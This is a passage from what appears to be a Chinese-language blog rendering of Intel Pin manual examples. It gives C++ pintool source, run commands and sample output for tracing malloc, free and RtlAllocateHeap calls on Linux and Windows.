IPOINT_TAKEN_BRANCH, (AFUNPTR)Taken,</div><div class=\"line\">                                   IARG_CONTEXT, IARG_END);</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\">            <span class=\"comment\">// Close the RTN.</span></div><div class=\"line\">            RTN_Close( rtn );</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    OutFile.close();</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This is the invocation pintool\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize pin &amp; symbol manager</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register ImageLoad to be called to instrument instructions</span></div><div class=\"line\">    IMG_AddInstrumentFunction(ImageLoad, <span class=\"number\">0</span>);</div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Write to a file since cout and cerr maybe closed by the application</span></div><div class=\"line\">    OutFile.open(KnobOutputFile.Value().c_str());</div><div class=\"line\">    OutFile.setf(ios::showbase);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"Finding-the-Value-of-Function-Arguments\"><a href=\"#Finding-the-Value-of-Function-Arguments\" class=\"headerlink\" title=\"Finding the Value of Function Arguments\"></a>Finding the Value of Function Arguments</h1><p>RTN_insertCall()可获得函数参数和返回地址。</p>\n<p>下例打印malloc()和free()函数的参数和malloc()函数的返回地址：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">../../../pin -t obj-ia32/malloctrace<span class=\"selector-class\">.so</span> -- /bin/cp makefile obj-ia32/malloctrace<span class=\"selector-class\">.so</span><span class=\"selector-class\">.makefile</span><span class=\"selector-class\">.copy</span></div><div class=\"line\">head malloctrace.out</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ezrwzop5gjj30k4071q3o.jpg\" alt=\"\"></p>\n<p>源码参见 source/tools/ManualExamples/malloctrace.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Names of malloc and free */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> defined(TARGET_MAC)</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MALLOC <span class=\"meta-string\">\"_malloc\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FREE <span class=\"meta-string\">\"_free\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MALLOC <span class=\"meta-string\">\"malloc\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FREE <span class=\"meta-string\">\"free\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Global Variables */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">std</span>::ofstream TraceFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Commandline Switches */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"malloctrace.out\"</span>, <span class=\"string\">\"specify trace file name\"</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Analysis routines                                                     */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Arg1Before</span><span class=\"params\">(CHAR * name, ADDRINT size)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile &lt;&lt; name &lt;&lt; <span class=\"string\">\"(\"</span> &lt;&lt; size &lt;&lt; <span class=\"string\">\")\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">MallocAfter</span><span class=\"params\">(ADDRINT ret)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile &lt;&lt; <span class=\"string\">\"  returns \"</span> &lt;&lt; ret &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Instrumentation routines                                              */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\">   </div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Image</span><span class=\"params\">(IMG img, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Instrument the malloc() and free() functions.  Print the input argument</span></div><div class=\"line\">    <span class=\"comment\">// of each malloc() or free(), and the return value of malloc().</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    <span class=\"comment\">//  Find the malloc() function.</span></div><div class=\"line\">    RTN mallocRtn = RTN_FindByName(img, MALLOC);</div><div class=\"line\">    <span class=\"keyword\">if</span> (RTN_Valid(mallocRtn))</div><div class=\"line\">    &#123;</div><div class=\"line\">        RTN_Open(mallocRtn);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// Instrument malloc() to print the input argument value and the return value.</span></div><div class=\"line\">        RTN_InsertCall(mallocRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before,</div><div class=\"line\">                       IARG_ADDRINT, MALLOC,</div><div class=\"line\">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class=\"number\">0</span>,</div><div class=\"line\">                       IARG_END);</div><div class=\"line\">        RTN_InsertCall(mallocRtn, IPOINT_AFTER, (AFUNPTR)MallocAfter,</div><div class=\"line\">                       IARG_FUNCRET_EXITPOINT_VALUE, IARG_END);</div><div class=\"line\"></div><div class=\"line\">        RTN_Close(mallocRtn);</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Find the free() function.</span></div><div class=\"line\">    RTN freeRtn = RTN_FindByName(img, FREE);</div><div class=\"line\">    <span class=\"keyword\">if</span> (RTN_Valid(freeRtn))</div><div class=\"line\">    &#123;</div><div class=\"line\">        RTN_Open(freeRtn);</div><div class=\"line\">        <span class=\"comment\">// Instrument free() to print the input argument value.</span></div><div class=\"line\">        RTN_InsertCall(freeRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before,</div><div class=\"line\">                       IARG_ADDRINT, FREE,</div><div class=\"line\">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class=\"number\">0</span>,</div><div class=\"line\">                       IARG_END);</div><div class=\"line\">        RTN_Close(freeRtn);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile.close();</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\">   </div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool produces a trace of calls to malloc.\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize pin &amp; symbol manager</span></div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\">    <span class=\"keyword\">if</span>( PIN_Init(argc,argv) )</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Write to a file since cout and cerr maybe closed by the application</span></div><div class=\"line\">    TraceFile.open(KnobOutputFile.Value().c_str());</div><div class=\"line\">    TraceFile &lt;&lt; hex;</div><div class=\"line\">    TraceFile.setf(ios::showbase);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Register Image to be called to instrument functions.</span></div><div class=\"line\">    IMG_AddInstrumentFunction(Image, <span class=\"number\">0</span>);</div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* eof */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"Finding-Functions-By-Name-on-Windows\"><a href=\"#Finding-Functions-By-Name-on-Windows\" class=\"headerlink\" title=\"Finding Functions By Name on Windows\"></a>Finding Functions By Name on Windows</h1><p>在Windows上通常函数名查找函数地址方法略有不同。<br>不同的信号量都指向相同的函数地址，最终的是检查所有信号量的名字。</p>\n<p>下例展示了，在信号量表中查找函数名字，然后利用信号量地址查找合适的返回地址。</p>\n<figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ..\\..\\..\\pin -t obj-ia32\\w_malloctrace.dll -- ..\\Tests\\obj-ia32\\<span class=\"keyword\">cp</span>-pin.exe makefile w_malloctrace.makefile.copy</div><div class=\"line\">$ head *.out</div><div class=\"line\"><span class=\"symbol\">Before:</span> RtlAllocateHeap(<span class=\"number\">00150000</span>, <span class=\"number\">0</span>, <span class=\"number\">0x94</span>)</div><div class=\"line\"><span class=\"symbol\">After:</span> RtlAllocateHeap  returns <span class=\"number\">0x153440</span></div><div class=\"line\"><span class=\"symbol\">After:</span> RtlAllocateHeap  returns <span class=\"number\">0x153440</span></div><div class=\"line\"><span class=\"symbol\">Before:</span> RtlAllocateHeap(<span class=\"number\">00150000</span>, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>)</div><div class=\"line\"><span class=\"symbol\">After:</span> RtlAllocateHeap  returns <span class=\"number\">0</span></div><div class=\"line\"><span class=\"symbol\">After:</span> RtlAllocateHeap  returns <span class=\"number\">0x1567c0</span></div><div class=\"line\"><span class=\"symbol\">Before:</span> RtlAllocateHeap(<span class=\"number\">019E0000</span>, <span class=\"number\">0x8</span>, <span class=\"number\">0x1800</span>)</div><div class=\"line\"><span class=\"symbol\">After:</span> RtlAllocateHeap  returns <span class=\"number\">0x19e0688</span></div><div class=\"line\"><span class=\"symbol\">Before:</span> RtlAllocateHeap(<span class=\"number\">00150000</span>, <span class=\"number\">0</span>, <span class=\"number\">0x1a</span>)thread begin <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"symbol\">After:</span> RtlAllocateHeap  returns <span class=\"number\">0</span></div></pre></td></tr></table></figure>\n<p>源码参见 source/tools/ManualExamples/w_malloctrace.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* This example demonstrates finding a function by name on Windows.      */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"keyword\">namespace</span> WINDOWS</div><div class=\"line\">&#123;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;Windows.h&gt;</span></span></div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Global Variables */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">std</span>::ofstream TraceFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Commandline Switches */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"w_malloctrace.out\"</span>, <span class=\"string\">\"specify trace file name\"</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool produces a trace of calls to RtlAllocateHeap.\"</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; KNOB_BASE::StringKnobSummary();</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Analysis routines                                                     */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Before</span><span class=\"params\">(CHAR * name, WINDOWS::HANDLE hHeap,</span></span></div><div class=\"line\">            WINDOWS::DWORD dwFlags, WINDOWS::DWORD dwBytes) </div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile &lt;&lt; <span class=\"string\">\"Before: \"</span> &lt;&lt; name &lt;&lt; <span class=\"string\">\"(\"</span> &lt;&lt; hex &lt;&lt; hHeap &lt;&lt; <span class=\"string\">\", \"</span></div><div class=\"line\">              &lt;&lt; dwFlags &lt;&lt; <span class=\"string\">\", \"</span> &lt;&lt; dwBytes &lt;&lt; <span class=\"string\">\")\"</span> &lt;&lt; dec &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">After</span><span class=\"params\">(CHAR * name, ADDRINT ret)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile &lt;&lt; <span class=\"string\">\"After: \"</span> &lt;&lt; name &lt;&lt; <span class=\"string\">\"  returns \"</span> &lt;&lt; hex</div><div class=\"line\">              &lt;&lt; ret &lt;&lt; dec &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Instrumentation routines                                              */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\">   </div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Image</span><span class=\"params\">(IMG img, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Walk through the symbols in the symbol table.</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    <span class=\"keyword\">for</span> (SYM sym = IMG_RegsymHead(img); SYM_Valid(sym); sym = SYM_Next(sym))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"built_in\">string</span> undFuncName = PIN_UndecorateSymbolName(SYM_Name(sym), UNDECORATION_NAME_ONLY);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">//  Find the RtlAllocHeap() function.</span></div><div class=\"line\">        <span class=\"keyword\">if</span> (undFuncName == <span class=\"string\">\"RtlAllocateHeap\"</span>)</div><div class=\"line\">        &#123;</div><div class=\"line\">            RTN allocRtn = RTN_FindByAddress(IMG_LowAddress(img) + SYM_Value(sym));</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"keyword\">if</span> (RTN_Valid(allocRtn))</div><div class=\"line\">            &#123;</div><div class=\"line\">                <span class=\"comment\">// Instrument to print the input argument value and the return value.</span></div><div class=\"line\">                RTN_Open(allocRtn);</div><div class=\"line\">                </div><div class=\"line\">                RTN_InsertCall(allocRtn, IPOINT_BEFORE, (AFUNPTR)Before,</div><div class=\"line\">                               IARG_ADDRINT, <span class=\"string\">\"RtlAllocateHeap\"</span>,</div><div class=\"line\">                               IARG_FUNCARG_ENTRYPOINT_VALUE, <span class=\"number\">0</span>,</div><div class=\"line\">                               IARG_FUNCARG_ENTRYPOINT_VALUE, <span class=\"number\">1</span>,</div><div class=\"line\">                               IARG_FUNCARG_ENTRYPOINT_VALUE, <span class=\"number\">2</span>,</div><div class=\"line\">                               IARG_END);</div><div class=\"line\">                RTN_InsertCall(allocRtn, IPOINT_AFTER, (AFUNPTR)After,</div><div class=\"line\">                               IARG_ADDRINT, <span class=\"string\">\"RtlAllocateHeap\"</span>,</div><div class=\"line\">                               IARG_FUNCRET_EXITPOINT_VALUE,</div><div class=\"line\">                               IARG_END);</div><div class=\"line\">                </div><div class=\"line\">                RTN_Close(allocRtn);</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    TraceFile.close();</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div 